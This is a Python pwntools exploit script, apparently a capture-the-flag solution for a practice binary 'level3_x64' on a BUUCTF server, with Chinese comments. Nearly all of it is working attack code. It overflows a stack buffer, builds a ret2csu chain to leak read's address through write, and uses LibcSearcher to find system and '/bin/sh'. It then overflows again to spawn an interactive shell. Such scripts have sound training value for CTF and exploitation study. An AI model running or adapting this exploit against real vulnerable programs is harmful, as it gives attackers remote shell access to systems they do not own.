from pwn import *
from LibcSearcher import LibcSearcher
import sys

io = -1
############################
#********修改文件名**********
############################
file_name = 'level3_x64'
port = 27974

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if len(sys.argv) > 1 and sys.argv[1].isdigit():
    io = remote('node3.buuoj.cn', int(sys.argv[1]))
    DEBUG = False
    def STOP(*args):
        pass
elif DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)
    DEBUG = False
    def STOP(*args):
        pass

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
context.update(os='linux', arch='amd64', log_level='debug', endian='little')

'''
ret2csu
'''
csu_end = 0x4006AA
csu_begin = 0x400690

io.recvuntil("Input:\n")
payload = 0x88 * b'a'
payload += p64(csu_end) + p64(0) + p64(1) + p64(io_elf.got['write'])
payload += p64(0x10) + p64(io_elf.got['read']) + p64(1)
payload += p64(csu_begin)
payload += 0x38 * b'a'
payload += p64(io_elf.sym['vulnerable_function'])

io.send(payload)
msg = io.recv()
print(msg)

read_addr = u64(msg[:6].ljust(8, b'\x00'))
LOG_ADDR_SUCCESS('read_addr', read_addr)

libc = LibcSearcher('read', read_addr)
libc_base = read_addr - libc.dump('read')
system_addr = libc_base + libc.dump('system')
str_bin_sh = libc_base + libc.dump('str_bin_sh')

LOG_ADDR_SUCCESS('libc_base', libc_base)
LOG_ADDR_SUCCESS('system_addr', system_addr)
LOG_ADDR_SUCCESS('str_bin_sh', str_bin_sh)

payload = b'a' * 0x88
payload += p64(0x4006b3) + p64(str_bin_sh)
payload += p64(system_addr)

STOP()
io.send(payload)

io.interactive()
